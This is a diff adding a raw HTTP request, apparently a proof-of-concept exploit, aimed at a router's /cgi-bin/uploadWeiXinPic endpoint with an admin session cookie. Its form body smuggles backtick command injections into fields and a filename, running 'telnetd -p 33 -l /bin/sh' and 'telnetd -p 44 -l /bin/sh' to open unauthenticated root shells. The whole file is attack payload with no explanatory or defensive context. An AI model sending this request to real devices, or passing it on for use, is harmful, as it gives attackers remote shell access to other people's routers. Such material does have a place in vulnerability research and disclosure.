@@ -1,0 +1,29 @@
+POST /cgi-bin/uploadWeiXinPic HTTP/1.1
+Host: 192.168.10.1
+Referer: http://192.168.10.1/login.html
+Cookie: bLanguage=cn; user=admin; workMode=slave
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 334
+
+-----------------------------11
+
+`telnetd -p 33 -l /bin/sh`aa-------
+
+
+-----------------------------11
+22----
+
+#_logoo --------------------------11
+33----
+
+-----------------------------11
+44----
+
+-----------------------------11
+55----
+
+`telnetd -p 44 -l /bin/sh`aa--filename
+
+-----------------------------11
+77--11
